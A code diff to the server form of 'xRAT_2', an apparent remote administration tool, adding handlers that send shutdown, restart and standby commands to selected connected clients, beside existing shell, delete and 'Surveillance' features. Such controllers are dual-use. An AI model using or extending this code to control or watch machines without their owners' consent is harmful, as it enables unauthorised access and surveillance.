@@ -92,6 +92,7 @@ namespace xRAT_2.Forms
                 typeof(Core.Packets.ServerPackets.ShellCommand),
                 typeof(Core.Packets.ServerPackets.Rename),
                 typeof(Core.Packets.ServerPackets.Delete),
+                typeof(Core.Packets.ServerPackets.Action),
                 typeof(Core.Packets.ClientPackets.Initialize),
                 typeof(Core.Packets.ClientPackets.Status),
                 typeof(Core.Packets.ClientPackets.UserStatus),
@@ -370,8 +371,44 @@ namespace xRAT_2.Forms
                     frmRS.Show();
                 }
             }
-            #endregion
             
+            private void ctxtShutdown_Click(object sender, EventArgs e)
+            {
+                if (lstClients.SelectedItems.Count != 0)
+                {
+                    foreach (ListViewItem lvi in lstClients.SelectedItems)
+                    {
+                        Client c = (Client)lvi.Tag;
+                        new Core.Packets.ServerPackets.Action(0).Execute(c);
+                    }
+                }
+            }
+            
+            private void ctxtRestart_Click(object sender, EventArgs e)
+            {
+                if (lstClients.SelectedItems.Count != 0)
+                {
+                    foreach (ListViewItem lvi in lstClients.SelectedItems)
+                    {
+                        Client c = (Client)lvi.Tag;
+                        new Core.Packets.ServerPackets.Action(1).Execute(c);
+                    }
+                }
+            }
+            
+            private void ctxtStandby_Click(object sender, EventArgs e)
+            {
+                if (lstClients.SelectedItems.Count != 0)
+                {
+                    foreach (ListViewItem lvi in lstClients.SelectedItems)
+                    {
+                        Client c = (Client)lvi.Tag;
+                        new Core.Packets.ServerPackets.Action(2).Execute(c);
+                    }
+                }
+            }
+            #endregion
+
             #region "Surveillance"
             private void ctxtRemoteDesktop_Click(object sender, EventArgs e)
             {
